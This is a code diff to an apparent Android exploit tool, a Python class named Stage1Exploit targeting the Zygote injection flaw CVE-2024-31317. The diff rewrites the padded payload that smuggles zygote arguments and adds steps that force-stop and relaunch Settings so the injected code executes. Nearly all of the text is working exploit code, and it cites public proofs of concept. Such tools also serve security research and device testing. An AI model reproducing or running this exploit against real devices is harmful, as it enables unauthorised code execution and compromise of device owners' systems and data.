@@ -203,8 +203,11 @@ class Stage1Exploit:
             # https://infosecwriteups.com/exploiting-android-zygote-injection-cve-2024-31317-d83f69265088
             return f"LClass1;->method1(\n{zygote_arguments}"
         elif exploit_type == "new":
-            # https://rtx.meta.security/exploitation/2024/06/03/Android-Zygote-injection.html
-            return f"\n\n\n\n\nAAAAAAAAAAAAAAAAAAAAAAAAAAA3\n{zygote_arguments}\n,,,,X"
+            # https://github.com/oddbyte/CVE-2024-31317/blob/main/31317/app/src/main/java/com/fh/exp31317/MainActivity.java
+            payload = "\n" * 3000 + "A" * 5157
+            payload += zygote_arguments
+            payload += "," + ",\n" * 1400
+            return payload
 
     def is_port_open(self, port: int) -> bool:
         "uses netstat to check if the port is open"
@@ -250,7 +253,9 @@ class Stage1Exploit:
         ]
 
         # run the exploit!
+        self.shell_execute(["am", "force-stop", "com.android.settings"])
         self.shell_execute(exploit_command)
+        time.sleep(0.25)
         self.shell_execute(["am", "start", "-a", "android.settings.SETTINGS"])
         print("Zygote injection complete, waiting for code to execute...")
 
